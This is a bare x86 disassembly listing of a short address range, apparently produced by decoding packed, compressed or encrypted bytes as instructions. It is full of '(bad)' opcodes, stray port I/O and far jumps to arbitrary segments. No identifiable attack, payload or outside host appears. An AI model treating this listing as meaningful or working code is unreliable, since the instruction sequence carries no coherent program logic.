  41fd41:	les    esp,FWORD PTR cs:[eax+0x3bf888f]
  41fd48:	arpl   bp,dx
  41fd4a:	inc    edx
  41fd4b:	mov    esi,0x26836ecd
  41fd50:	pop    edx
  41fd51:	and    al,0xc2
  41fd53:	popa   
  41fd54:	xchg   ebx,eax
  41fd55:	rcr    bl,0x75
  41fd58:	cmp    BYTE PTR [ecx-0x2f],ch
  41fd5b:	aas    
  41fd5c:	outs   dx,BYTE PTR ds:[esi]
  41fd5d:	dec    ecx
  41fd5e:	lods   eax,DWORD PTR ds:[esi]
  41fd5f:	cwde   
  41fd60:	and    DWORD PTR [ebp-0x6d],edi
  41fd63:	xchg   ecx,eax
  41fd64:	dec    esi
  41fd65:	inc    ebp
  41fd66:	push   es
  41fd67:	fcomip st,st(7)
  41fd69:	in     al,0x83
  41fd6b:	out    dx,al
  41fd6c:	icebp  
  41fd6d:	jne    0x41fda4
  41fd6f:	call   0x147d552a
  41fd74:	rol    ebx,cl
  41fd76:	pop    esp
  41fd77:	test   BYTE PTR [ebx],cl
  41fd79:	and    DWORD PTR [ebp+0x63],ebx
  41fd7c:	mov    WORD PTR [edx+0x66],?
  41fd7f:	imul   edx,DWORD PTR [esi],0x33
  41fd82:	jae    0x41fd8b
  41fd84:	in     al,0xfe
  41fd86:	mov    DWORD PTR [edx*4-0x5f4000f9],esi
  41fd8d:	fs pop es
  41fd8f:	(bad)  
  41fd90:	pop    esp
  41fd91:	repnz sbb al,0xf6
  41fd94:	mov    WORD PTR [edi+0x19c9df81],?
  41fd9a:	push   ebp
  41fd9b:	cmp    eax,0xa13635b6
  41fda0:	aam    0xa9
  41fda2:	push   eax
  41fda3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fda4:	repnz pop ecx
  41fda6:	sub    al,BYTE PTR [esi+edi*2-0xcb8abc8]
  41fdad:	int    0x7a
  41fdaf:	fadd   QWORD PTR ds:0x7faaedd4
  41fdb5:	lods   eax,DWORD PTR ds:[esi]
  41fdb6:	pop    ecx
  41fdb7:	std    
  41fdb8:	cmp    DWORD PTR [eax-0x7b],ebp
  41fdbb:	nop
  41fdbc:	pop    es
  41fdbd:	neg    DWORD PTR [esp+eiz*2-0x7f]
  41fdc1:	add    eax,0xd0a34c1d
  41fdc6:	sbb    al,0x1d
  41fdc8:	mov    esp,0x15067e1c
  41fdcd:	inc    ecx
  41fdce:	iret   
  41fdcf:	and    BYTE PTR [edx-0x71fd6f5c],al
  41fdd5:	xlat   BYTE PTR ds:[ebx]
  41fdd6:	jb     0x41fe24
  41fdd8:	add    al,0x20
  41fdda:	iret   
  41fddb:	push   edi
  41fddc:	cld    
  41fddd:	cmp    al,0xa4
  41fddf:	adc    al,BYTE PTR [ebx+0x7670d3a]
  41fde5:	inc    ebp
  41fde6:	outs   dx,DWORD PTR ds:[esi]
  41fde7:	retf   0x772d
  41fdea:	ins    BYTE PTR es:[edi],dx
  41fdeb:	mov    edi,0x7ff25e5f
  41fdf0:	mov    BYTE PTR [ecx+ecx*2+0x77],bh
  41fdf4:	out    0xde,eax
  41fdf6:	or     esi,DWORD PTR [ebx-0x51b31ec9]
  41fdfc:	pop    edx
  41fdfd:	fwait
  41fdfe:	stos   BYTE PTR es:[edi],al
  41fdff:	sbb    al,0xa
  41fe01:	or     ecx,ebx
  41fe03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe04:	adc    al,0x75
  41fe06:	rcr    cl,cl
  41fe08:	cmc    
  41fe09:	ds push edx
  41fe0b:	es sub al,0x1d
  41fe0e:	into   
  41fe0f:	clc    
  41fe10:	fcmovnbe st,st(3)
  41fe12:	add    ebx,DWORD PTR [eax-0x13]
  41fe15:	xlat   BYTE PTR ds:[ebx]
  41fe16:	fbstp  TBYTE PTR [eax+0x54]
  41fe19:	inc    DWORD PTR [esi]
  41fe1b:	scas   al,BYTE PTR es:[edi]
  41fe1c:	jmp    0x6a02:0x6ed01155
  41fe23:	es frndint 
  41fe26:	call   0x3eca:0x79deb01e
  41fe2d:	and    al,dh
  41fe2f:	mov    WORD PTR [ebx-0x9],cs
  41fe32:	sub    edx,esp
  41fe34:	outs   dx,BYTE PTR ds:[esi]
  41fe35:	divps  xmm0,XMMWORD PTR [esi+0x2edb6bf5]
  41fe3c:	jecxz  0x41fe26
  41fe3e:	ja     0x41fe48
  41fe40:	jmp    0x617a0ecd
  41fe45:	jg     0x41fdce
  41fe47:	mov    BYTE PTR [edi-0x2df82a3f],bl
  41fe4d:	fisub  WORD PTR [edi+0x688db070]
  41fe53:	popa   
  41fe54:	pusha  
  41fe55:	ret    
  41fe56:	inc    edx
  41fe57:	sbb    eax,0xcdf46adf
  41fe5c:	aas    
  41fe5d:	jle    0x41fe19
  41fe5f:	mov    al,0xf9
  41fe61:	out    dx,al
  41fe62:	xor    bh,ah
  41fe64:	clc    
  41fe65:	and    DWORD PTR [edi],0x10
  41fe68:	jmp    FWORD PTR [eax+0x78d37b9c]
  41fe6e:	mov    edx,0x2a8caf27
  41fe73:	dec    esp
  41fe74:	jbe    0x41fe08
  41fe76:	cwde   
  41fe77:	lods   eax,DWORD PTR ds:[esi]
  41fe78:	xlat   BYTE PTR ds:[ebx]
  41fe79:	pop    ebx
  41fe7a:	fisub  DWORD PTR [esi+0x32]
  41fe7d:	ficomp WORD PTR [ecx+0x16c0ecea]
  41fe83:	popa   
  41fe84:	xor    al,0x74
  41fe86:	add    ebx,DWORD PTR [eax-0x60cee786]
  41fe8c:	cs scas eax,DWORD PTR es:[edi]
  41fe8e:	xor    DWORD PTR [edx-0x59],esp
  41fe91:	sbb    dl,BYTE PTR [esi+0x507f4388]
  41fe97:	loope  0x41fe94
  41fe99:	mov    bh,0xff
  41fe9b:	cmp    eax,0xba5c1282
  41fea0:	icebp  
  41fea1:	stos   BYTE PTR es:[edi],al
  41fea2:	jl     0x41ff0d
  41fea4:	sub    esi,ebp
  41fea6:	daa    
  41fea7:	xchg   esp,eax
  41fea8:	pop    ecx
  41fea9:	lods   al,BYTE PTR ds:[esi]
  41feaa:	arpl   WORD PTR [ebp-0x799884b3],dx
  41feb0:	push   0xcc368a38
  41feb5:	lods   eax,DWORD PTR ds:[esi]
  41feb6:	int3   
  41feb7:	jmp    0xea355f6b
  41febc:	sar    BYTE PTR [edi+0x66a487b9],0xd3
  41fec3:	sbb    DWORD PTR [esi],ebx
  41fec5:	sub    BYTE PTR [ebp-0x647e2004],ah
  41fecb:	fs cwde 
  41fecd:	xchg   edx,eax
  41fece:	jb     0x41fef0
  41fed0:	ss jmp 0x94a7:0x63bc54d1
  41fed8:	ret    0x303
  41fedb:	jmp    0x28a51532
  41fee0:	and    eax,0xfb4728d4
  41fee5:	pop    ss
  41fee6:	push   ss
  41fee7:	adc    DWORD PTR [ebp+0x544fbd16],0xaecb13f9
  41fef1:	cmp    ebp,edx
  41fef3:	ja     0x41feb5
  41fef5:	sbb    ah,BYTE PTR [ebp+ecx*8+0x4f]
  41fef9:	cmp    bh,0x10
  41fefc:	gs sti 
  41fefe:	shr    bh,0x54
  41ff01:	adc    esp,DWORD PTR [ebp-0x15]
  41ff04:	cmp    al,0x14
  41ff06:	jb     0x41fec1
  41ff08:	sub    bl,dl
  41ff0a:	leave  
  41ff0b:	pop    ds
  41ff0c:	loop   0x41fef0
  41ff0e:	into   
  41ff0f:	lahf   
  41ff10:	jecxz  0x41feeb
  41ff12:	cmp    ch,cl
  41ff14:	call   0x6aa0:0xdc5aa5c7
  41ff1b:	sbb    ecx,eax
  41ff1d:	mov    bh,0x4d
  41ff1f:	pop    edi
  41ff20:	adc    ch,bh
  41ff22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff23:	lahf   
  41ff24:	data16 sahf 
  41ff26:	pop    esi
  41ff27:	sbb    WORD PTR [edi],bx
  41ff2a:	dec    esi
  41ff2b:	pop    esi
  41ff2c:	(bad)  
  41ff2d:	jne    0x41feda
  41ff2f:	mov    ebx,0xe5b781fd
  41ff34:	sub    eax,0xcd07890b
  41ff39:	and    BYTE PTR [ebx],ah
  41ff3b:	punpckldq mm7,DWORD PTR [ebp-0x5b]
  41ff3f:	rol    BYTE PTR [esi],cl
  41ff41:	repz xor al,0x90
  41ff44:	mov    bh,0xc3
  41ff47:	sub    ah,BYTE PTR [ebx]
  41ff49:	adc    esi,DWORD PTR [edx+0x5cafb607]
  41ff4f:	loopne 0x41ff97
  41ff51:	repnz xchg ecx,eax
  41ff53:	call   FWORD PTR [ecx+0xf]
  41ff56:	dec    esi
  41ff57:	xchg   ebx,eax
  41ff58:	mov    ah,0x27
  41ff5a:	pop    ebx
  41ff5b:	and    DWORD PTR [esi],esi
  41ff5d:	mov    al,ch
  41ff5f:	data16 mov dl,BYTE PTR [esi]
  41ff62:	sub    DWORD PTR [edx+0xd3ccd62],esi
  41ff68:	adc    DWORD PTR [eax],eax
  41ff6a:	jge    0x41ffb0
  41ff6c:	js     0x41fef4
  41ff6e:	jno    0x41ff7c
  41ff70:	fist   DWORD PTR [ebx+0x3f]
  41ff73:	xchg   DWORD PTR [edi+0x6479e213],ebp
  41ff79:	in     eax,dx
  41ff7a:	jg     0x41ff4f
  41ff7c:	inc    edx
  41ff7d:	sbb    BYTE PTR [esi],al
  41ff7f:	pop    ebx
  41ff80:	mov    bl,0xe1
  41ff82:	adc    ah,ah
  41ff84:	add    al,0x1a
  41ff86:	inc    ebp
  41ff87:	jmp    0x2ee0:0x826a716
  41ff8e:	mov    dh,0x24
  41ff90:	hlt    
  41ff91:	in     eax,0xb0
  41ff93:	fnsave [edx+0x71]
  41ff96:	(bad)  
  41ff97:	(bad)  
  41ff98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff99:	jo     0x41ffa2
  41ff9b:	jnp    0x420003
  41ff9d:	sbb    eax,0x3d5ed4c0
  41ffa2:	push   esi
  41ffa3:	jmp    0xa4170d1c
  41ffa8:	test   eax,0xb5c37013
  41ffad:	mov    ebx,0xe172fc24
  41ffb2:	cmc    
  41ffb3:	xor    esp,DWORD PTR [ecx+0x6e8821a7]
  41ffb9:	dec    ebp
  41ffba:	addr16 js 0x41ff99
  41ffbd:	mov    al,BYTE PTR [esi-0x4385a8c8]
  41ffc3:	js     0x41ff64
  41ffc5:	ret    
  41ffc6:	imul   edx,DWORD PTR [ebx+0x245931b4],0xffffffae
  41ffcd:	jecxz  0x41ff5e
  41ffcf:	jge    0x420016
  41ffd1:	call   0xf1e20047
  41ffd6:	test   BYTE PTR [ecx-0x29],0x68
  41ffda:	repnz inc edi
  41ffdc:	and    ch,BYTE PTR [edi]
  41ffde:	xlat   BYTE PTR ds:[ebx]
  41ffdf:	icebp  
  41ffe0:	push   cs
  41ffe1:	out    dx,eax
  41ffe2:	jbe    0x41ffaf
  41ffe4:	fst    DWORD PTR [eax-0x166b7afb]
  41ffea:	mov    WORD PTR [esi+0xc],cs
  41ffed:	sti    
  41ffee:	cmovge ecx,eax
  41fff1:	xor    eax,0x64682bb7
  41fff6:	and    dl,BYTE PTR [esi]
  41fff8:	jae    0x41ff85
  41fffa:	push   ss
  41fffb:	sahf   
  41fffc:	popa   
  41fffd:	mov    WORD PTR [ecx+0x2e303977],?
  420003:	je     0x41ffd5
  420005:	xor    al,bl
  420007:	sbb    ebx,DWORD PTR [edx+0x4231844e]
  42000d:	fimul  WORD PTR [edx]
  42000f:	mov    ah,0x44
  420011:	out    0x80,al
  420013:	sub    eax,0xdaefe6a2
  420018:	mov    ebp,0x2a9a778a
  42001d:	or     BYTE PTR [eax+0x3f],ah
  420020:	rcl    BYTE PTR [ebx+0x6f],cl
  420023:	cmp    eax,0xe3cd0a61
  420028:	cmp    al,0x2b
  42002a:	inc    edi
  42002b:	xchg   ebx,eax
  42002c:	mov    ebp,0x679eaf78
  420031:	adc    BYTE PTR [esi+0x179397c7],ah
  420037:	push   cs
  420038:	clc    
  420039:	not    DWORD PTR [eax+edx*4+0x4]
  42003d:	pop    ss
  42003e:	fmul   QWORD PTR [esi-0x11]
  420041:	jb     0x420001
  420043:	adc    esp,DWORD PTR ds:0xd5def444
  420049:	pop    eax
  42004a:	jno    0x42003b
  42004c:	scas   al,BYTE PTR es:[edi]
  42004d:	or     al,0xf6
  42004f:	jbe    0x420082
  420051:	mov    ebp,ecx
  420053:	sbb    eax,0xcb61b21d
  420058:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420059:	lods   al,BYTE PTR ds:[esi]
  42005a:	pop    edi
  42005b:	sub    dh,bl
  42005d:	xlat   BYTE PTR ds:[ebx]
  42005e:	mov    es,WORD PTR [ecx-0x54]
  420061:	fsubr  DWORD PTR [ecx+eax*8-0xb]
  420065:	and    cl,dl
  420067:	mov    ebx,0xf889bd79
  42006c:	loope  0x4200a8
  42006e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42006f:	outs   dx,DWORD PTR ds:[esi]
  420070:	into   
  420071:	fidivr WORD PTR [esi-0x434f2e25]
  420077:	lds    ecx,FWORD PTR [ebp+0x75]
  42007a:	ja     0x4200d7
  42007c:	xchg   edx,eax
  42007d:	jg     0x420014
  42007f:	ret    0x2b69
  420082:	(bad)  
  420084:	(bad)  
  420085:	test   DWORD PTR [ebx-0x39],0xc78798b5
  42008c:	cld    
  42008d:	sahf   
  42008e:	push   cs
  42008f:	cld    
  420090:	cmp    DWORD PTR [ebp+0x3b45265a],esp
  420096:	jno    0x420039
  420098:	clc    
  420099:	mov    ebp,edi
  42009b:	ds stos DWORD PTR es:[edi],eax
  42009d:	std    
  42009e:	iret   
  42009f:	sbb    al,0x9d
  4200a1:	mov    ebx,0x193ba011
  4200a6:	shr    BYTE PTR [eax],cl
  4200a8:	pusha  
  4200a9:	sbb    ebp,ebx
  4200ab:	scas   al,BYTE PTR es:[edi]
  4200ac:	cmp    eax,0xd6eca74b
  4200b1:	fst    DWORD PTR [ecx-0xa]
  4200b4:	neg    ecx
  4200b6:	adc    edi,DWORD PTR [ecx]
  4200b8:	shr    dl,cl
  4200ba:	test   eax,0x69cf861
  4200bf:	jp     0x4200b2
  4200c1:	ins    BYTE PTR es:[edi],dx
  4200c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4200c3:	mov    esp,0xb9fcfa9a
  4200c8:	xor    DWORD PTR [ebx+ecx*8],0x7b
  4200cc:	lods   eax,DWORD PTR cs:[esi]
  4200ce:	or     eax,0x4584da5
  4200d3:	sbb    eax,0x8a9f898c
  4200d8:	xor    bl,al
  4200da:	inc    eax
  4200db:	ds xchg ebp,eax
  4200dd:	mov    ch,0xb9
  4200df:	xor    edi,DWORD PTR [ebx+0x1d]
  4200e2:	ret    0xc4ee
  4200e5:	mov    ?,edi
  4200e7:	sub    eax,0x517c0ac
  4200ec:	mov    BYTE PTR [edi-0x2d],cl
  4200ef:	xchg   ah,bh
  4200f1:	outs   dx,BYTE PTR ds:[esi]
  4200f2:	mov    WORD PTR [esi],ss
  4200f4:	in     eax,0xcd
  4200f6:	mov    ?,WORD PTR [edx-0x594dab08]
  4200fc:	jmp    0x4415:0x95055f57
  420103:	outs   dx,DWORD PTR ds:[esi]
  420104:	jb     0x42013c
  420106:	arpl   WORD PTR [esi-0x61fb6c76],di
  42010c:	mov    dh,0xeb
  42010e:	stos   BYTE PTR es:[edi],al
  42010f:	jl     0x420113
  420111:	jmp    0x5115:0x58336577
  420118:	push   ebp
  420119:	fs mov ?,eax
  42011c:	icebp  
  42011d:	mov    ds,WORD PTR [eax-0x33]
  420120:	test   ebx,0x65f44fd4
  420126:	dec    edx
  420127:	out    0x2a,al
  420129:	arpl   WORD PTR [ebx],cx
  42012b:	rcl    DWORD PTR [ecx+0x4a],1
  42012e:	fwait
  42012f:	dec    edx
  420130:	push   esp
  420131:	adc    eax,0xba934544
  420136:	pop    ebx
  420137:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420138:	aas    
  420139:	and    al,0xf8
  42013b:	shl    BYTE PTR [esi],1
  42013d:	imul   edx
  42013f:	and    BYTE PTR [ebx],0x84
  420142:	inc    esi
  420143:	mov    al,ds:0x58e8eff9
  420148:	mov    dl,0x83
  42014a:	or     al,BYTE PTR [esi]
  42014c:	stc    
  42014d:	mov    eax,ds:0xba671eea
  420152:	test   al,0x68
  420154:	inc    edx
  420155:	push   esi
  420156:	dec    ebx
  420157:	jmp    0x253c8635
  42015c:	push   ecx
  42015d:	push   0xffffffee
  42015f:	jbe    0x420174
  420161:	hlt    
  420162:	ja     0x4201d8
  420164:	test   BYTE PTR [esi],dl
  420166:	arpl   WORD PTR [edx+0xf],sp
  420169:	stos   DWORD PTR es:[edi],eax
  42016a:	inc    ecx
  42016b:	out    0x94,al
  42016d:	cmp    al,0x1e
  42016f:	push   ebp
  420170:	jge    0x420138
  420172:	sbb    edi,edi
  420174:	loop   0x4201a9
  420176:	icebp  
  420177:	sub    esi,esi
  420179:	cmp    bl,BYTE PTR [ecx]
  42017b:	mov    al,0xba
  42017d:	xchg   edi,eax
  42017e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42017f:	and    BYTE PTR [esi-0xe],dh
  420182:	fadd   QWORD PTR [edx]
  420184:	push   cs
  420185:	mov    al,0x83
  420188:	bound  ebp,QWORD PTR [edx+0x30]
  42018b:	and    BYTE PTR [esi+0xf5e814],al
  420191:	gs arpl ax,cx
  420194:	mov    al,BYTE PTR [edi-0x49]
  420197:	adc    dl,BYTE PTR [esi]
  420199:	jno    0x4201ce
  42019b:	mov    ds:0xcb7eb64d,eax
  4201a0:	jns    0x4201ad
  4201a2:	sti    
  4201a3:	push   0x44fa3a49
  4201a8:	pushf  
  4201a9:	pusha  
  4201aa:	adc    DWORD PTR [ebx+esi*4],ebp
  4201ad:	clc    
  4201ae:	xchg   bh,bh
  4201b0:	sar    BYTE PTR [ecx],0x49
  4201b3:	clc    
  4201b4:	pop    eax
  4201b5:	sbb    BYTE PTR [edi],0xa9
  4201b8:	out    0xb6,eax
  4201ba:	ds dec ecx
  4201bc:	test   bh,dl
  4201be:	inc    ebx
  4201bf:	dec    edi
  4201c0:	mov    edi,0xc2dfc77b
  4201c5:	dec    eax
  4201c6:	cmp    BYTE PTR [ecx],al
  4201c8:	xor    BYTE PTR [ebx+edi*8+0x20],0x17
  4201cd:	pop    ss
  4201ce:	pop    ebp
  4201cf:	loop   0x42024e
  4201d1:	mov    ds:0x6aff3677,al
  4201d6:	adc    al,0xe7
  4201d8:	out    dx,al
  4201d9:	dec    ecx
  4201da:	aas    
  4201db:	mov    BYTE PTR [eax-0x28],ah
  4201de:	je     0x4201e8
  4201e0:	lods   al,BYTE PTR es:[esi]
  4201e2:	dec    ebp
  4201e3:	mov    bl,dl
  4201e5:	call   0x91c6:0x41e5feab
  4201ec:	out    0x22,al
  4201ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4201ef:	push   edi
  4201f0:	pop    ebp
  4201f1:	mov    ah,0x3a
  4201f3:	jns    0x420184
  4201f5:	addr16 loope 0x4201a1
  4201f8:	or     eax,0x615f795f
  4201fd:	es cmc 
  4201ff:	sbb    eax,0x56e47e2
  420204:	mov    ch,BYTE PTR [ecx-0x4c]
  420207:	mov    WORD PTR [edi+0x24],ss
  42020a:	test   BYTE PTR [ecx+0x1bbd1e2e],al
  420210:	mov    esi,0x6f4022db
  420215:	cdq    
  420216:	mov    edx,0x641f9a86
  42021b:	add    esi,DWORD PTR ds:0x9df90c79
  420221:	adc    eax,0xe2bd8605
  420226:	sub    al,0x21
  420228:	and    al,0x8a
  42022a:	addr16 retf 
  42022c:	fist   DWORD PTR [esi+0x33067372]
  420232:	stc    
  420233:	lock int3 
  420235:	xchg   esp,eax
  420236:	(bad)  
  420237:	in     eax,0x70
  420239:	popf   
  42023a:	sub    esi,DWORD PTR [eax+eax*8]
  42023d:	pop    esi
  42023e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42023f:	test   BYTE PTR [esi+0x1d],dl
  420242:	neg    DWORD PTR [eax+edx*8-0x79]
  420246:	inc    ecx
  420247:	sub    al,0x4a
  420249:	xlat   BYTE PTR ds:[ebx]
  42024a:	inc    ecx
  42024b:	and    eax,0xd9e9188e
  420250:	and    DWORD PTR [edx+0x5811d764],edi
  420256:	pop    es
  420257:	retf   
  420258:	ja     0x4201f1
  42025a:	out    0x0,eax
  42025c:	out    dx,al
  42025d:	dec    esi
  42025e:	lea    edi,[esp+esi*8]
  420261:	push   ecx
  420262:	sar    DWORD PTR [edx+0x44dee14a],cl
  420268:	and    esi,ebx
  42026a:	in     eax,0x1c
  42026c:	dec    edi
  42026d:	push   esp
  42026e:	dec    ebx
  42026f:	dec    esp
  420270:	aam    0x9e
  420272:	adc    al,0x3c
  420274:	shl    BYTE PTR [esi+0x64],cl
  420277:	xchg   edx,eax
  420278:	ror    DWORD PTR [eax+0x29],1
  42027b:	loop   0x42020e
  42027d:	test   BYTE PTR [edi],dh
  42027f:	in     eax,dx
  420280:	cs std 
  420282:	and    BYTE PTR [ecx],bh
  420284:	scas   eax,DWORD PTR es:[edi]
  420285:	mov    BYTE PTR [edi+esi*1+0x39],bl
  420289:	cmp    ebp,DWORD PTR [esi-0x75]
  42028c:	rol    DWORD PTR [edx-0x4e7590be],cl
  420292:	es int3 
  420294:	or     al,0xb6
  420296:	shr    DWORD PTR [ebp+0x45c63b9a],1
  42029c:	mov    al,ds:0x888c91f6
  4202a1:	jle    0x420270
  4202a3:	push   ecx
  4202a4:	sbb    eax,0x734531ec
  4202a9:	mov    eax,ds:0xdb4eeef0
  4202ae:	dec    esp
  4202af:	sub    al,0xd
  4202b1:	xchg   ecx,eax
  4202b2:	dec    ebx
  4202b3:	inc    ebp
  4202b4:	adc    ecx,0x6fbeaef7
  4202ba:	int    0xcc
  4202bc:	mov    ?,WORD PTR [edi-0x46]
  4202bf:	add    BYTE PTR [edi],cl
  4202c1:	fmul   st,st(3)
  4202c3:	xor    eax,0x4430127d
  4202c8:	push   ecx
  4202c9:	mov    esp,0x411d4267
  4202ce:	mov    ch,0x1c
  4202d0:	cmp    BYTE PTR [ecx+0x22],al
  4202d3:	loop   0x4202c3
  4202d5:	sub    al,0x7e
  4202d7:	xor    esi,DWORD PTR [ecx+0x66]
  4202da:	stc    
  4202db:	test   BYTE PTR ss:[ebx+0x0],bh
  4202df:	ins    DWORD PTR es:[edi],dx
  4202e0:	lock test DWORD PTR [esi+0x7c],esi
  4202e4:	nop
  4202e5:	jecxz  0x420282
  4202e7:	jnp    0x4202b2
  4202e9:	xor    cl,cl
  4202eb:	sar    BYTE PTR [ebx+0x3777b946],0x36
  4202f2:	mov    WORD PTR [edi+edx*8-0x7d0d6f2f],es
  4202f9:	jae    0x42028f
  4202fb:	(bad)  
  4202fd:	je     0x420325
  4202ff:	and    al,0x38
  420301:	rcl    DWORD PTR [esi],0x95
  420304:	stos   DWORD PTR es:[edi],eax
  420305:	sbb    esi,edx
  420307:	sbb    eax,0x6d40b788
  42030c:	pop    es
  42030d:	jge    0x42029b
  42030f:	jbe    0x42033b
  420311:	repnz (bad) 
  420313:	lock mov edi,0xd867978
  420319:	mov    bl,0x30
  42031b:	adc    BYTE PTR [ebx-0x43d83d22],bl
  420321:	xchg   edx,eax
  420322:	popf   
  420323:	ja     0x4202fb
  420325:	adc    ah,BYTE PTR [edi]
  420327:	mov    esi,?
  420329:	pop    ecx
  42032a:	and    eax,0xe3d31064
  42032f:	cmp    eax,0xe1a04ff7
  420334:	inc    ebp
  420335:	or     BYTE PTR [esi+edi*4+0x1facbb9e],bl
  42033c:	outs   dx,BYTE PTR ds:[esi]
  42033d:	jg     0x4203af
  42033f:	(bad)  
  420340:	in     eax,0xef
  420342:	or     DWORD PTR [edx-0x5c64201e],edi
  420348:	add    BYTE PTR [esi],ch
  42034a:	in     al,0x4a
  42034c:	adc    eax,0x7e7d6f6
  420351:	repz add dl,cl
  420354:	jnp    0x42035e
  420356:	and    DWORD PTR [edx-0x19],eax
  420359:	mov    eax,ds:0xd0b2dcd2
  42035e:	icebp  
  42035f:	stos   DWORD PTR es:[edi],eax
  420360:	cmp    ah,ch
  420362:	fdivr  DWORD PTR [edi+eax*4-0x26]
  420366:	cmp    BYTE PTR [edi],bh
  420368:	or     bh,cl
  42036a:	mov    al,ds:0xf18b7928
  42036f:	loop   0x4202f6
  420371:	fwait
  420372:	xchg   ebp,eax
  420373:	ins    BYTE PTR es:[edi],dx
  420374:	xor    esp,DWORD PTR [edx-0x58]
  420377:	mov    eax,ds:0x9bb0e3ba
  42037c:	jmp    0xe463b5da
  420381:	sub    DWORD PTR ds:0x52f046db,ebx
  420387:	fwait
  420388:	call   0x8ef7:0xcc3c933b
  42038f:	fcmovnbe st,st(4)
  420391:	in     eax,dx
  420392:	mov    ebp,0x73dbb908
  420397:	fwait
  420398:	sub    DWORD PTR [ebx+0x18],esp
  42039b:	push   0xfffffff7
  42039d:	aas    
  42039e:	rcr    edx,0xf5
  4203a1:	stos   BYTE PTR es:[edi],al
  4203a2:	add    bh,bh
  4203a4:	mov    ecx,0xffb7c9e4
  4203a9:	push   ebx
  4203aa:	push   esp
  4203ab:	mov    esi,0xdc3ddd89
  4203b0:	and    ch,cl
  4203b2:	mov    esp,0x5d4479f5
  4203b7:	iret   
  4203b8:	sbb    eax,0x400fe82e
  4203bd:	adc    BYTE PTR ds:0x35af6585,bh
  4203c3:	pop    ebx
  4203c4:	out    0x11,eax
  4203c6:	ins    DWORD PTR es:[edi],dx
  4203c7:	or     esi,DWORD PTR [edi-0x5a]
  4203ca:	xlat   BYTE PTR ds:[ebx]
  4203cb:	mov    BYTE PTR fs:[ecx-0x499c2aa6],cl
  4203d2:	jns    0x420355
  4203d4:	(bad)  
  4203d5:	xchg   DWORD PTR [esi],esi
  4203d7:	out    dx,eax
  4203d8:	outs   dx,DWORD PTR ds:[esi]
  4203d9:	into   
  4203da:	inc    edx
  4203db:	or     al,0x3c
  4203dd:	xchg   BYTE PTR [edi],cl
  4203df:	call   0xd4e7:0xa9eb5f42
  4203e6:	pop    esp
  4203e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4203e8:	or     eax,0x161e30c3
  4203ed:	mov    ah,BYTE PTR ss:[ecx+0x56]
  4203f1:	iret   
  4203f2:	sqrtps xmm5,XMMWORD PTR [ecx-0x14]
  4203f6:	jmp    0xcd34a97e
  4203fb:	bound  esi,QWORD PTR [esi+0x7a]
  4203fe:	adc    al,0x53
  420400:	in     eax,0x2d
  420402:	adc    DWORD PTR [eax],edi
  420404:	ja     0x4203fd
  420406:	jecxz  0x420447
  420408:	enter  0xb696,0xff
  42040c:	mov    dh,0x2b
  42040e:	lahf   
  42040f:	cwde   
  420410:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420411:	ret    
  420412:	push   ss
  420413:	sub    DWORD PTR [ecx+eiz*2],eax
  420416:	xchg   edi,eax
  420417:	sub    al,0x61
  420419:	in     al,0x84
  42041b:	(bad)  
  42041c:	cwde   
  42041d:	fcom   DWORD PTR [eax+0x5d40234f]
  420423:	lea    edi,[edx-0x73]
  420426:	loopne 0x42048d
  420428:	iret   
  420429:	mov    BYTE PTR [edx-0x33d01592],dh
  42042f:	adc    eax,DWORD PTR [ebp+0x29]
  420432:	inc    ebp
  420433:	retf   
  420434:	mov    ebx,0x8ca23da6
  420439:	hlt    
  42043a:	mov    ds:0xe86ff84a,eax
  42043f:	fmulp  st(1),st
  420441:	(bad)  
  420442:	jmp    0x420468
  420444:	loop   0x42046f
  420446:	mov    bh,0xdf
  420448:	lods   eax,DWORD PTR ds:[esi]
  420449:	cdq    
  42044a:	scas   al,BYTE PTR es:[edi]
  42044b:	mov    dh,ch
  42044d:	aaa    
  42044e:	or     al,BYTE PTR [ebx]
  420450:	dec    ebp
  420451:	fbld   TBYTE PTR [ebx+0x12d3fd59]
  420457:	jmp    0x54754acd
  42045c:	jmp    0x1c05edc
  420461:	lods   eax,DWORD PTR ds:[esi]
  420462:	sbb    edi,edi
  420464:	and    BYTE PTR [ecx],0x76
  420467:	(bad)  
  420468:	jmp    0xdbf050b1
  42046d:	xchg   edi,eax
  42046e:	fidiv  WORD PTR [edi+ebx*4+0x6f]
  420472:	leave  
  420473:	mov    edi,0xd1758489
  420478:	mov    dl,0x65
  42047a:	adc    DWORD PTR [esi+0x463e23e1],ebx
  420480:	jo     0x42040a
  420482:	add    DWORD PTR [ebx-0x1b],ebp
  420485:	jo     0x420461
  420487:	sub    eax,0xd7c72307
  42048c:	pusha  
  42048d:	mov    edx,0x2e745032
  420492:	mov    edi,0xbbdc8e58
  420497:	loopne 0x42043c
  420499:	add    ah,BYTE PTR [edi+0xf]
  42049c:	pop    edi
  42049d:	push   edx
  42049e:	fwait
  42049f:	loope  0x420501
  4204a1:	xchg   esp,eax
  4204a2:	dec    ebx
  4204a3:	shr    BYTE PTR [edx-0x3f],1
  4204a6:	sub    DWORD PTR [ecx],ebx
  4204a8:	xor    BYTE PTR [eax+0x3c4d0821],dl
  4204ae:	pop    ebp
  4204af:	retf   
  4204b0:	addr16 cmp eax,0x70934101
  4204b6:	fidivr WORD PTR [edi]
  4204b8:	lea    eax,[esi-0x4bfffe33]
  4204be:	pop    edi
  4204bf:	cdq    
  4204c0:	sub    bh,BYTE PTR [ebx]
  4204c2:	inc    edx
  4204c3:	jecxz  0x420459
  4204c5:	mov    ch,0x96
  4204c7:	sub    al,0xb6
  4204c9:	shl    BYTE PTR [esi+eax*4],0x61
  4204cd:	xchg   edi,eax
  4204ce:	xchg   ebp,eax
  4204cf:	stos   DWORD PTR es:[edi],eax
  4204d0:	adc    esi,DWORD PTR [edi-0x6e7dbf70]
  4204d6:	jbe    0x42052a
